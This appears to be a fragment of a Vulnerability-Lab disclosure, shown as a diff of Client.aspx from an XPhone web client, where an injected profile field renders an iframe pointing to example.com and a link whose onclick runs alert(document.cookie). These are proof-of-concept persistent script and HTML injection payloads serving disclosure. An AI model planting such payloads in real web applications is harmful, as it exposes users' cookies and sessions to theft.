@@ -1,0 +1,12 @@
+
+File: Client.aspx
+
+<div id="XPhoneMCDivSearchDetails" style="display: block;" class="ai2" title="Anwesend (Bis auf Weiteres)" userguid="7c9064ab-d6ce-XXXX-XXXX-XXXXXXXXXXXX">
+<strong>Julien Ahrens</strong>
+<br>Vulnerability-Lab<br><iframe src="http://www.example.com/index.php"></iframe>
+</div>
+
+<div id="XPhoneMCDivSearchDetails" style="display: block; " class="ai2" title="Anwesend (Bis auf Weiteres)" userguid="7c9064ab-d6ce-XXXX-XXXX-XXXXXXXXXXXX">
+<strong>Julien Ahrens</strong><br>
+<a href="www.vulnerability-lab.com" onclick="javascript:alert(document.cookie)">Vulnerability-Lab</a>
+</div>
